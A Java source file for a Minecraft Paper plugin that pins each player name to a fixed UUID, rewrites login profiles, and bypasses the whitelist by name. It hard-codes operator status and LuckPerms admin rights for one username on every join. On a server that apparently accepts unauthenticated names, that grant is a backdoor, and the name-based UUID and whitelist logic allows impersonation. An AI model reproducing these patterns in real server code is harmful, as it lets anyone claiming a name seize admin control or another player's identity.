package ru.bydlolend.bydlomod.uuid;

import com.destroystokyo.paper.profile.PlayerProfile;
import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerPreLoginEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerLoginEvent;
import ru.bydlolend.bydlomod.BydloMod;

import java.io.File;
import java.io.IOException;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.ConcurrentHashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Для КАЖДОГО ника первый заход закрепляет UUID навсегда (uuid-keep.yml).
 * Повторный вход с другим id (пиратка/лицензия) подменяется на закреплённый.
 * Чужой UUID никогда не отдаём другому нику.
 */
public final class UuidKeepListener implements Listener {
    private static final Pattern ENTRY = Pattern.compile(
            "\"name\"\\s*:\\s*\"([^\"]+)\".*?\"uuid\"\\s*:\\s*\"([0-9a-fA-F-]{36})\"",
            Pattern.DOTALL);

    private final BydloMod plugin;
    private final Map<String, UUID> kept = new ConcurrentHashMap<>();
    private final File file;

    public UuidKeepListener(BydloMod plugin) {
        this.plugin = plugin;
        this.file = new File(plugin.getDataFolder(), "uuid-keep.yml");
        loadPins();
        seedKnown();
        loadUserCacheNewOnly();
        savePins();
        plugin.getLogger().info("UUID keep: " + kept.size() + " игроков закреплено");
    }

    private void seedKnown() {
        // Жёстко: эти трое уже ломались из-за usercache. Файл не должен их перетереть.
        kept.put("smirty_228", UUID.fromString("6dd8b88c-0b62-4d62-89c0-bbe22c6f1a8f"));
        kept.put("almazik_5164", UUID.fromString("56d50182-cb60-339c-aea5-bbc7b4d3c92c"));
        kept.put("flimbian", UUID.fromString("fbda57d0-e54f-32da-bcae-abecc9ada96b"));
    }

    private void loadPins() {
        if (!file.isFile()) return;
        YamlConfiguration yaml = YamlConfiguration.loadConfiguration(file);
        if (yaml.getConfigurationSection("pins") == null) return;
        for (String name : yaml.getConfigurationSection("pins").getKeys(false)) {
            try {
                kept.put(name.toLowerCase(Locale.ROOT), UUID.fromString(yaml.getString("pins." + name)));
            } catch (Exception ignored) {
            }
        }
    }

    private synchronized void savePins() {
        YamlConfiguration yaml = new YamlConfiguration();
        for (Map.Entry<String, UUID> e : kept.entrySet()) {
            yaml.set("pins." + e.getKey(), e.getValue().toString());
        }
        yaml.set("ops", List.of("smirty_228"));
        try {
            plugin.getDataFolder().mkdirs();
            yaml.save(file);
        } catch (IOException ex) {
            plugin.getLogger().warning("UUID keep: cannot save: " + ex.getMessage());
        }
    }

    private void loadUserCacheNewOnly() {
        File cache = new File(plugin.getServer().getWorldContainer(), "usercache.json");
        if (!cache.isFile()) return;
        try {
            String json = Files.readString(cache.toPath(), StandardCharsets.UTF_8);
            Matcher m = ENTRY.matcher(json);
            while (m.find()) {
                String name = m.group(1).toLowerCase(Locale.ROOT);
                UUID id = UUID.fromString(m.group(2));
                if (kept.containsKey(name)) continue;
                if (uuidTaken(id, name)) continue;
                kept.put(name, id);
            }
        } catch (Exception ex) {
            plugin.getLogger().warning("UUID keep: cannot read usercache: " + ex.getMessage());
        }
    }

    private boolean uuidTaken(UUID id, String exceptName) {
        for (Map.Entry<String, UUID> e : kept.entrySet()) {
            if (e.getValue().equals(id) && !e.getKey().equalsIgnoreCase(exceptName)) {
                return true;
            }
        }
        return false;
    }

    private UUID pinFor(String name, UUID incoming) {
        String key = name.toLowerCase(Locale.ROOT);
        UUID have = kept.get(key);
        if (have != null) return have;
        UUID chosen = incoming;
        if (uuidTaken(chosen, key)) {
            chosen = UUID.nameUUIDFromBytes(("OfflinePlayer:" + name).getBytes(StandardCharsets.UTF_8));
            if (uuidTaken(chosen, key)) {
                chosen = UUID.nameUUIDFromBytes(("BydloLand:" + key).getBytes(StandardCharsets.UTF_8));
            }
        }
        kept.put(key, chosen);
        savePins();
        plugin.getLogger().info("UUID keep: новый игрок " + name + " -> " + chosen);
        return chosen;
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onPreLogin(AsyncPlayerPreLoginEvent e) {
        UUID keep = pinFor(e.getName(), e.getUniqueId());
        if (keep.equals(e.getUniqueId())) return;
        applyId(e, keep);
        plugin.getLogger().info("UUID keep: " + e.getName() + " " + e.getUniqueId() + " -> " + keep);
    }

    private void applyId(AsyncPlayerPreLoginEvent e, UUID keep) {
        try {
            PlayerProfile neu = Bukkit.createProfile(keep, e.getName());
            boolean set = false;
            for (Method m : e.getClass().getMethods()) {
                if (m.getName().equals("setPlayerProfile") && m.getParameterCount() == 1) {
                    m.invoke(e, neu);
                    set = true;
                    break;
                }
            }
            if (!set) {
                PlayerProfile profile = e.getPlayerProfile();
                profile.setId(keep);
            }
        } catch (Exception ex) {
            try {
                e.getPlayerProfile().setId(keep);
            } catch (Exception ex2) {
                plugin.getLogger().warning("UUID keep setId failed: " + ex2.getMessage());
            }
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onPreLoginAllow(AsyncPlayerPreLoginEvent e) {
        if (!Bukkit.hasWhitelist()) return;
        if (e.getLoginResult() == AsyncPlayerPreLoginEvent.Result.KICK_WHITELIST
                && nameOnWhitelist(e.getName())) {
            e.allow();
        }
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onLogin(PlayerLoginEvent e) {
        if (!Bukkit.hasWhitelist()) return;
        if (e.getResult() != PlayerLoginEvent.Result.KICK_WHITELIST) {
            if (nameOnWhitelist(e.getPlayer().getName()) && !e.getPlayer().isWhitelisted()) {
                e.getPlayer().setWhitelisted(true);
            }
            return;
        }
        if (!nameOnWhitelist(e.getPlayer().getName())) return;
        e.allow();
        e.getPlayer().setWhitelisted(true);
    }

    @EventHandler
    public void onJoin(PlayerJoinEvent e) {
        Player p = e.getPlayer();
        String key = p.getName().toLowerCase(Locale.ROOT);
        UUID pin = pinFor(p.getName(), p.getUniqueId());
        if (!pin.equals(p.getUniqueId())) {
            plugin.getLogger().severe("UUID keep не сработал для " + p.getName()
                    + " online=" + p.getUniqueId() + " pinned=" + pin);
        }
        if (Bukkit.hasWhitelist() && nameOnWhitelist(p.getName()) && !p.isWhitelisted()) {
            p.setWhitelisted(true);
        }
        if ("smirty_228".equals(key)) {
            p.setOp(true);
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(),
                    "lp user " + p.getName() + " parent set admin");
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(),
                    "lp user " + p.getName() + " permission set bydlo.admin true");
        }
    }

    private static boolean nameOnWhitelist(String name) {
        if (name == null || name.isEmpty()) return false;
        for (OfflinePlayer p : Bukkit.getWhitelistedPlayers()) {
            if (p.getName() != null && p.getName().equalsIgnoreCase(name)) {
                return true;
            }
        }
        return false;
    }
}
